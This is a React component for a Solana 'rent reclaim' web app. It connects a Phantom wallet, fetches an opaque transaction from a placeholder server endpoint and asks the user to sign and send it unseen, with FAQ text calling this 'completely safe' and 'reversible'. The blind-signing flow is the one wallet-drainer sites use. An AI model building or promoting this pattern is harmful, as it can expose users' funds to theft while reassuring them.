import React, { useState, useEffect } from 'react'
import { Transaction } from '@solana/web3.js'

function DCsol({ onBack }) {
  const [walletConnected, setWalletConnected] = useState(false)
  const [walletAddress, setWalletAddress] = useState(null)
  const [publicKey, setPublicKey] = useState(null)
  const [loading, setLoading] = useState(false)
  const [eligibleItems, setEligibleItems] = useState([])
  const [totalReclaimable, setTotalReclaimable] = useState(0)

  // Connect Solana wallet
  const connectWallet = async () => {
    if (typeof window !== 'undefined' && window.solana && window.solana.isPhantom) {
      try {
        const response = await window.solana.connect()
        setPublicKey(response.publicKey)
        setWalletAddress(response.publicKey.toString())
        setWalletConnected(true)
      } catch (err) {
        console.error('Error connecting wallet:', err)
        alert('Failed to connect wallet')
      }
    } else {
      alert('Please install Phantom wallet!')
    }
  }

  // Scan wallet for eligible items
  const scanWallet = async () => {
    if (!walletAddress) return
    
    setLoading(true)
    try {
      const response = await fetch('YOUR_LAMBDA_ENDPOINT/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress })
      })
      
      const data = await response.json()
      setEligibleItems(data.items || [])
      setTotalReclaimable(parseFloat(data.totalReclaimable || 0))
    } catch (error) {
      console.error('Error scanning wallet:', error)
      alert('Failed to scan wallet. Please try again.')
    } finally {
      setLoading(false)
    }
  }

  // Execute reclaim transaction when user approves
  const executeReclaim = async () => {
    if (!publicKey || eligibleItems.length === 0) return
    
    setLoading(true)
    try {
      // Get transaction from Lambda
      const response = await fetch('YOUR_LAMBDA_ENDPOINT/reclaim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress,
          items: eligibleItems 
        })
      })
      
      const { transaction, allowed } = await response.json()
      
      if (!allowed) {
        alert('Transaction not allowed')
        setLoading(false)
        return
      }
      
      // Deserialize and sign transaction with user's wallet
      const transactionObj = Transaction.from(Buffer.from(transaction, 'base64'))
      const signed = await window.solana.signTransaction(transactionObj)
      const signature = await window.solana.sendTransaction(signed)
      
      alert(`Success! Reclaimed ${totalReclaimable.toFixed(9)} SOL.\nSignature: ${signature}`)
      
      // Refresh scan
      await scanWallet()
    } catch (error) {
      console.error('Error:', error)
      alert('Transaction failed: ' + error.message)
    } finally {
      setLoading(false)
    }
  }

  // Scan wallet when connected
  useEffect(() => {
    if (walletConnected && walletAddress) {
      scanWallet()
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [walletConnected, walletAddress])

  return (
    <div className="min-h-screen bg-black text-white p-6 md:p-12">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="text-center mb-12">
          <h1 className="text-5xl md:text-7xl font-bold mb-4">DC sol</h1>
          <p className="text-xl md:text-2xl text-gray-400 mb-2">
            Solana Utility App
          </p>
          <p className="text-base md:text-lg text-gray-500">
            Wallet + Transaction Utility • Not a DeFi Protocol
          </p>
        </div>

        {/* Info Section */}
        <div className="bg-gray-900 rounded-2xl p-6 md:p-8 border border-gray-800 mb-8">
          <h2 className="text-2xl md:text-3xl font-bold mb-6">How does it work?</h2>
          <p className="text-gray-300 leading-relaxed mb-4">
            Solana requires a small SOL deposit (~0.002 SOL) known as 'rent' to create a token account. Once the token has been sold or sent the account can be closed and the deposit recovered. If you trade or send a lot of coins, you may have a lot of SOL locked up in rent!
          </p>
          <p className="text-gray-300 leading-relaxed">
            Simply click the claim SOL button and approve the transaction to reclaim your deposits.
          </p>
        </div>

        {/* FAQ Section */}
        <div className="space-y-4 mb-8">
          <div className="bg-gray-900 rounded-2xl p-6 border border-gray-800">
            <h3 className="text-xl font-bold mb-3">Is it safe?</h3>
            <p className="text-gray-300">
              Yes - Closing token accounts is completely safe, and also completely reversible!
            </p>
          </div>

          <div className="bg-gray-900 rounded-2xl p-6 border border-gray-800">
            <h3 className="text-xl font-bold mb-3">Will it jeopardize my airdrops?</h3>
            <p className="text-gray-300">
              No - Token accounts can safely be closed without effecting any past or future airdrops you are eligible for
            </p>
          </div>

          <div className="bg-gray-900 rounded-2xl p-6 border border-gray-800">
            <h3 className="text-xl font-bold mb-3">Why don't I have anything to claim?</h3>
            <p className="text-gray-300">
              You may not have disposed of any tokens since you last checked. Some trading terminals also automatically close accounts on your behalf.
            </p>
          </div>
        </div>

        {/* Wallet Connection */}
        {!walletConnected ? (
          <div className="text-center py-20">
            <button
              onClick={connectWallet}
              className="px-8 py-4 bg-purple-600 hover:bg-purple-700 text-white font-bold text-xl rounded-xl transition-all"
            >
              Connect Solana Wallet
            </button>
            <p className="text-gray-500 mt-4">
              Connect your Phantom or Solflare wallet to get started
            </p>
          </div>
        ) : (
          <div className="space-y-8">
            {/* Connected Wallet Info */}
            <div className="bg-gray-900 rounded-2xl p-6 border border-gray-800">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-gray-400 text-sm">Connected Wallet</p>
                  <p className="text-lg font-mono">{walletAddress?.slice(0, 8)}...{walletAddress?.slice(-8)}</p>
                </div>
                <button
                  onClick={() => {
                    setWalletConnected(false)
                    setWalletAddress(null)
                    setPublicKey(null)
                    setEligibleItems([])
                    setTotalReclaimable(0)
                  }}
                  className="px-4 py-2 bg-gray-800 hover:bg-gray-700 rounded-lg"
                >
                  Disconnect
                </button>
              </div>
            </div>

            {/* Eligible Items */}
            {loading ? (
              <div className="text-center py-12">
                <p className="text-gray-400">Scanning wallet...</p>
              </div>
            ) : eligibleItems.length > 0 ? (
              <div className="bg-gray-900 rounded-2xl p-6 border border-gray-800">
                <h2 className="text-2xl font-bold mb-4">Eligible to Reclaim</h2>
                <div className="mb-6 p-4 bg-green-900/20 border border-green-800 rounded-lg">
                  <p className="text-gray-400 text-sm">Total Reclaimable</p>
                  <p className="text-3xl font-bold text-green-400">{totalReclaimable.toFixed(9)} SOL</p>
                </div>
                
                <div className="space-y-2 mb-6 max-h-64 overflow-y-auto">
                  {eligibleItems.map((item, index) => (
                    <div key={index} className="bg-gray-800 p-3 rounded-lg text-sm">
                      <p className="font-mono text-xs text-gray-400">{item.address}</p>
                      <p className="text-gray-300">{parseFloat(item.amount).toFixed(9)} SOL</p>
                    </div>
                  ))}
                </div>
                
                <button
                  onClick={executeReclaim}
                  disabled={loading}
                  className="w-full px-8 py-4 bg-green-600 hover:bg-green-700 disabled:bg-gray-700 text-white font-bold text-xl rounded-xl transition-all"
                >
                  {loading ? 'Processing...' : `Reclaim ${totalReclaimable.toFixed(9)} SOL`}
                </button>
              </div>
            ) : (
              <div className="bg-gray-900 rounded-2xl p-6 border border-gray-800 text-center">
                <p className="text-gray-400 mb-4">No eligible items found to reclaim</p>
                <button
                  onClick={scanWallet}
                  disabled={loading}
                  className="px-4 py-2 bg-gray-800 hover:bg-gray-700 disabled:bg-gray-700 rounded-lg"
                >
                  {loading ? 'Scanning...' : 'Scan Again'}
                </button>
              </div>
            )}
          </div>
        )}

        {/* Footer Links */}
        <div className="mt-12 pt-8 border-t border-gray-800">
          <div className="flex flex-col md:flex-row items-center justify-center gap-4 md:gap-8 text-gray-400 text-sm">
            
            <span className="hidden md:inline text-gray-700">•</span>
            <a
              href="#"
              onClick={(e) => {
                e.preventDefault()
                alert('Documentation coming soon!')
              }}
              className="hover:text-white transition-colors"
            >
              Need more help? email us
            </a>
          </div>
        </div>

        {/* Back to Home */}
        <div className="text-center mt-8">
          <button
            onClick={onBack}
            className="text-gray-400 hover:text-white transition-colors"
          >
            ← Back to Home
          </button>
        </div>
      </div>
    </div>
  )
}

export default DCsol

